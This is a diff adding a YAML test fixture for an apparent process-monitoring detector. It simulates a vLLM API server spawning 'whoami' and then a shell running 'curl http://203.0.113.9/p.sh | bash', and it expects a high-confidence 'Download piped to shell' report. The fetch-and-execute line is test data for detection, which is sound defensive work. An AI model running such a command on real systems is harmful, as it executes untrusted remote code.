@@ -1,0 +1,30 @@
+subjects:
+  vllm:
+    session: pid/100:1
+    program: /usr/bin/python3.10
+    actors: [{id: svc-vllm, name: vllm-serving, kind: agent}]
+    device: gpu-1
+    source: probe
+  recon:
+    session: pid/101:1
+    parent: vllm
+    program: /usr/bin/whoami
+    actors: [{id: svc-vllm, name: vllm-serving, kind: agent}]
+    device: gpu-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: vllm
+    program: /bin/sh
+    actors: [{id: svc-vllm, name: vllm-serving, kind: agent}]
+    device: gpu-1
+    source: probe
+observations:
+  - {kind: spawn, subject: vllm, cmdline: "python3 -m vllm.entrypoints.openai.api_server --model meta-llama/Llama-3-8B --host 0.0.0.0 --kv-transfer-config {\"kv_connector\":\"MooncakeConnector\"}"}
+  - {kind: spawn, subject: recon, cmdline: "whoami"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c \"curl http://203.0.113.9/p.sh | bash\""}
+expect:
+  action: report
+  reason_contains: "high-confidence"
+  output_contains: ["Download piped to shell", "1 corroborating"]
+  chain_min: 3
